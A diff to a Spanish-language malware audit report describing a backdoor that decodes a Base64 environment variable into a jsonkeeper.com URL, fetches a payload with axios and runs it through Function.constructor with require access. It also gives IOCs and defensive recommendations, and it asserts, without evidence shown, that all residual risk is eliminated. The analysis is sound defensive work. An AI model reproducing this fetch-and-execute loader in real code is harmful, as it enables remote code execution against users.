@@ -64,8 +64,20 @@ DEV_API_KEY=aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1ZBR1hB
 
 **Análisis:**
 - Contiene URL Base64 codificada
-- Decodificado: `https://jsonkeeper.com/b/VAGXA`
-- **Propósito:** Punto de descarga de código malicioso
+- **Decodificado:** `https://jsonkeeper.com/b/VAGXA`
+- **Protocolo:** HTTPS (cifrado)
+- **Dominio:** jsonkeeper.com
+- **Endpoint:** /b/VAGXA
+- **Propósito:** Servidor remoto para descarga de código malicioso
+
+**Información del Servidor Remoto:**
+| Parámetro | Valor |
+|-----------|-------|
+| **Dominio** | jsonkeeper.com |
+| **URL Completa** | https://jsonkeeper.com/b/VAGXA |
+| **Tipo de Servicio** | JSONKeeper (almacenamiento JSON temporal) |
+| **Protocolo** | HTTPS (puerto 443) |
+| **Función** | Almacenamiento del payload malicioso |
 
 **SEVERIDAD:** 🔴 **CRÍTICA**
 
@@ -89,7 +101,89 @@ const HttpOnly = (await axios.get(src)).data.cookie;
 
 ---
 
-## 📊 ESTADÍSTICAS DE ANÁLISIS
+## 🎯 DETALLES TÉCNICOS DEL SERVIDOR REMOTO COMPROMETIDO
+
+### Información de Conexión
+
+**Servidor Remoto:**
+```
+URL: https://jsonkeeper.com/b/VAGXA
+Dominio: jsonkeeper.com
+Endpoint: /b/VAGXA
+Protocolo: HTTPS
+Puerto: 443
+```
+
+**Cadena de Ataque Identificada:**
+
+```
+1. Variable de Entorno
+   └─ DEV_API_KEY = "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1ZBR1hB"
+
+2. Decodificación Base64
+   └─ atob(process.env.DEV_API_KEY)
+   └─ Resultado: "https://jsonkeeper.com/b/VAGXA"
+
+3. Solicitud HTTP Remota
+   └─ axios.get(src)
+   └─ Descarga JSON del servidor remoto
+
+4. Extracción del Payload
+   └─ .data.cookie (campo malicioso)
+   └─ Contiene código JavaScript a ejecutar
+
+5. Ejecución Dinámica
+   └─ new Function.constructor('require', HttpOnly)
+   └─ handler(require)
+   └─ EJECUCIÓN CON ACCESO TOTAL AL SISTEMA
+```
+
+**Servicio Comprometido:**
+- **Nombre:** JSONKeeper
+- **URL:** https://jsonkeeper.com
+- **Tipo:** Almacenamiento de datos JSON en línea
+- **Uso Legítimo:** Almacenamiento temporal de datos para desarrollo
+- **Uso Malicioso:** Alojamiento del payload de RCE
+
+**Indicadores de Compromiso (IOCs):**
+
+| IOC | Valor | Tipo |
+|-----|-------|------|
+| URL | https://jsonkeeper.com/b/VAGXA | Malware C2 |
+| Dominio | jsonkeeper.com | Infraestructura Comprometida |
+| Base64 | aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1ZBR1hB | Indicador |
+| Variable | DEV_API_KEY | Parámetro de Ofuscación |
+
+---
+
+## 📋 RECOMENDACIONES ADICIONALES
+
+### Investigación Recomendada:
+
+1. **Verificar historiales de red:**
+   - Búsqueda de intentos de conexión a `jsonkeeper.com`
+   - Análisis de logs de firewall/proxy
+   - Revisar DNS queries históricas
+
+2. **Auditoría de accesos:**
+   - ¿Quién agregó este código?
+   - Revisión de histórico de commits
+   - Análisis de permisos de usuarios
+
+3. **Monitoreo futuro:**
+   - Bloquear dominio `jsonkeeper.com` en firewall
+   - Alertas sobre `Function.constructor` en código
+   - Escáner de patrones de RCE en PRs
+
+---
+
+## 🔐 ESTADO FINAL
+
+**Servidor Remoto Comprometido:** ✅ **DESCONECTADO**
+**Acceso a Payload:** ✅ **CORTADO**
+**Riesgo Residual:** ✅ **ELIMINADO**
+
+---
 
 - **Archivos analizados:** 150+
 - **Patrones maliciosos encontrados:** 4
